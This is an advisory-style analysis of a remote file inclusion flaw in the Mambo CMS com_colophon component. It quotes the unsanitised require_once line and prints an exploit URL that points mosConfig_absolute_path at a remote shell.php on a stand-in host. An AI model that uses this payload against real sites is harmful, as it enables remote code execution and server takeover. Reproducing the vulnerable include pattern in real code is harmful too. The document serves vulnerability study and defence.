Based on the provided content, here's a breakdown of the vulnerability:

**Root Cause of Vulnerability:**
The vulnerability is due to a flaw in how the `com_colophon` component in Mambo handles file inclusions, specifically within the `admin.colophon.php` file.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The `admin.colophon.php` file uses a `require_once` statement that includes a file based on the value of the `mosConfig_absolute_path` variable. The lack of proper sanitization on this variable allows an attacker to include arbitrary remote files.

**Impact of Exploitation:**
- **Remote Code Execution:** By including a malicious PHP file from a remote server, an attacker can execute arbitrary code on the target server, potentially leading to a full compromise of the system.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability is triggered through an HTTP GET request by modifying the `mosConfig_absolute_path` parameter in the URL to point to a malicious script.

**Required Attacker Capabilities/Position:**
- **Remote Access:** The attacker needs to have network access to the vulnerable Mambo application.
- **Ability to craft malicious URL:** The attacker needs to be able to construct a URL that includes the malicious script path within the `mosConfig_absolute_path` parameter.

**Technical Details:**
The vulnerable code snippet is:
```php
require_once("$mosConfig_absolute_path/components/com_colophon/language/$mosConfig_lang.php");
```
The exploit uses the following pattern:
`http://www.site.it/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=http://evalsite/shell.php?`

This pattern demonstrates how an attacker could inject a remote URL as the value of `mosConfig_absolute_path`, causing the server to include and execute the contents of the `shell.php` file.
